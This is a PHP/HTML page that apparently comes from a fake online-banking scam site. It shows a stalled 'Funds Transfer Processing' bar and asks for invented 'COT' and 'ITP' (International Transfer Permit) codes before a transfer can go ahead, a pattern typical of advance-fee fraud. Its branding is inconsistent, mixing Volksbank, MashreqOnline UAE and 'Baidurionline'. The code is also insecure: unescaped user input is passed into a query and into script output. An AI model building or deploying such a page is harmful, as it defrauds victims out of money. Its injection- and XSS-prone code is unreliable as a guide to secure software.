<?php
session_start();
?>

<?php 
include("includes/db.php");

if(isset($_POST['pro'])){
	
	$item = mysql_real_escape_string($_POST['item']);
	

	$admin_query = "select item from cot where item='$item' AND id=1";

	$run = mysql_query($admin_query); 
	
	
	if(mysql_num_rows($run)>0){
	
	
	echo "<script>alert('Your COT verification is successfull. Press OK to continue')</script>";
	echo "<script>window.open('proceed3.php?user=".$_SESSION['user']."','_self')</script>";
	}
	else {
	
	echo "<script>alert('Code Invalid. Try Again!')</script>";
	echo "<script>window.open('proceed2.php?user=".$_SESSION['user']."','_self')</script>";
	
	}
}


?>











<html>


<head>
<title>Volksbank Banking - Requirements</title>
<link REL="STYLESHEET" TYPE="text/css" HREF="css/cmn/default.css"/>
<meta http-equiv="" content="5">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<script src="https://code.jquery.com/jquery-1.11.3.js"></script>
  <script>
      $(document).ready(function () {
          // Hide the div
          $("#div1").hide();
          // Show the div after 5s
          $("#div1").delay(10000).fadeIn(100);  
      });    
  </script>


<style type="text/css">
.black_overlay {
  display: none;
  position: absolute;
  top: 0%;
  left: 0%;
  width: 100%;
  height: 30%;
  background-color: black;
  z-index: 1001;
  -moz-opacity: 0.8;
  opacity: .80;
  filter: alpha(opacity=80);
}
.white_content {
  display: none;
  position: absolute;
  top: 25%;
  left: 25%;
  width: 50%;
  height: 20%;
  padding: 16px;
  border: 16px solid orange;
  background-color: white;
  z-index: 1002;
  overflow: auto;
}




#progressbar {
    width: 100%;
    height: 15px;
    background-color: #eee;
    padding: 2px;
    margin: .6em 0;
    border: 1px #000 double;
    clear: both;
}

#progress {
    background: #A1C969; /*-- Color of the bar --*/
    height: 15px;
    width: 0%;
    max-width: 100%;
    float: left;
    -webkit-animation: progress 2s 1 forwards;
    -moz-animation: progress 2s 1 forwards;
    -ms-animation: progress 2s 1 forwards;
    animation: progress 2s 1 forwards;
}

#pbaranim {
    height: 15px;
    width: 100%;
    overflow: hidden;
    background: url('http://www.cssdeck.com/uploads/media/items/7/7uo1osj.gif') repeat-x;
    -moz-opacity: 0.25;
    -khtml-opacity: 0.25;
    opacity: 0.25;
    -ms-filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=25);
    filter: progid:DXImageTransform.Microsoft.Alpha(opacity=25);
    filter: alpha(opacity=25);
}

@-webkit-keyframes progress { 
    from { width: 10% }

    to { width: 26% }
}

@-moz-keyframes progress { 
    from { width: 10% }

    to { width: 26% }
}

@-ms-keyframes progress { 
    from { width: 10% }

    to { width: 26% }
}

@keyframes progress { 
    from { width: 10% }

    to { width: 26% }
}






</style>










</head>
<body background="images/mol-samsung-bg.jpg" onload="document.getElementById('light').style.display='block';document.getElementById('fade').style.display='block'">
<table width="780" cellpadding="0" align="center" cellspacing="0" border="0">
	<tr>
  		<td colspan="2" align="center" valign="top"><img src="images/mol_head_uae.jpg" alt="MashreqOnline UAE" width="780" height="79"></td>
	</tr>
</table>
<table width="780" cellpadding="8" align="center" cellspacing="0" border="0" bgcolor="white">
	<tr>
  		<td width="110" align="left" valign="bottom" class="PageTitle">Account Details</td>
		<td width="363" align="right" vAlign="top" class="SuperLinks"><strong>&raquo; <A href="logout.php">Sign Out Home | </A></strong| <A href="privacy-policy.htm"> Privacy Policy</A>| <A href="service-terms.htm"> Service Terms</A>| <A href="security.htm">Security</A></td>
        
      <td align="center"  style="background-color:#2042eb; color:white;" ><br>
      TRANSFER FUNDS
         </td>
         
	</tr>
	<tr>
    <?php
include_once 'includes/dbMySql.php';
if(isset($_GET['user'])){
		$cat_id = $_GET['user'];
$con = new DB_con();

$res=$con->select($cat_id);


while($row=mysql_fetch_row($res))
{ 
?>

		
        
                            
                         
		<td colspan="2" align="left" valign="top" >
        
        <img src="../admin/images/<?php echo $row[14] ?>" width="200" height="200" ><br>
		<strong><?php echo $row[4] ?></strong><br><br>
		<b>Personal Details:</b>
		<ul>
		<strong>Date of birth:</strong> <?php echo $row[5] ?>
        <br>
        <strong>Nationality:</strong> <?php echo $row[6] ?> 
        <br>
		<strong>State:</strong> <?php echo $row[7] ?></li> 
<br>
		<strong>City:</strong> <?php echo $row[8] ?>
<br>
		<strong>Account Type:</strong> <?php echo $row[9] ?>
        <br>
        <strong>Account Number:</strong> <?php echo $row[10] ?> 
       
        
        <br>
        <strong>Reg. Date:</strong> <?php echo $row[12] ?>
        <br>
        <strong>Account Status:</strong> <?php echo $row[13] ?>
		</ul>
	
		<br><br>
	<hr>
        
        <?php }}?>	
								
<div id="light" class="white_content">
<div>  <!--<span style="float:right" id='close' onclick='this.parentNode.parentNode.parentNode.removeChild(this.parentNode.parentNode); return false;'>&#10006 </span>--><p></p></div>

<div><h4>Funds Transfer Processing...</h4></div>
<div id="progressbar"><div id="progress" ><div id="pbaranim">

</div></div>
 
</div>
<div id="div1">
	 <p></p>
    <form method="post" action="proceed4.php?user=<?php echo $_SESSION['user']; ?>">
    <label>Please enter your ITP code to proceed with your funds transfer<br/><strong>ITP</strong> code is International Transfer Permit code is the validation code of your Escrow Account transfer remittance permit.</label>
    <input type="text" name="item" placeholder="ITP" required>
  
    <input type="submit" value="Proceed" name="pro">
    
    </form>
</div>
  </div>	
		
		<td width="1"></td>
        
	</tr>
	<tr>
  
  
  
    
	  <td colspan="2" align="center" valign="top">
      We maintain security standards and procedures to help prevent unauthorized access to confidential information about your account through Baidurionline. Our web servers are 128bit SSL protected. This means that all your sessions to and from the bank over the internet are encrypted using a 128 bit key. The 128 bit encryption is the highest form of commercially available encryption.
         </td>
         <td colspan="2" align="right" valign="top"><br>
         <label>Click here to request for loan</label>
		  <form name="form1" method="post" action="">
          <input type="submit" value="Request for loan">
          
	    </form>
         </td>
         <td colspan="2" align="left" valign="top"><br>
		  
         </td>
         
	</tr>
    <tr><td colspan="2" align="center" valign="top"><br>
		  © 2018, Volksbank Steiermark AG
         </td></tr>
</table>
</body>


</html>